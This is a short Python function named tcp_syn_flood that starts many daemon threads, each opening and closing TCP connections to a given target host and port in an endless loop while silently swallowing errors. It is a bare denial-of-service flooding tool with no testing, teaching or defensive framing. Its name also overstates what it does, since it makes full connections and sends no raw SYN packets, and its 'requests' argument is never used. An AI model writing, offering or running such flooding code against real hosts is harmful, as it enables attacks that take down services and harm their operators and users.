def tcp_syn_flood(target, port, requests, threads):
    import threading, socket

    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.close()
            except:
                pass

    print(f"[SYN] Sending TCP SYN to {target}:{port}")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
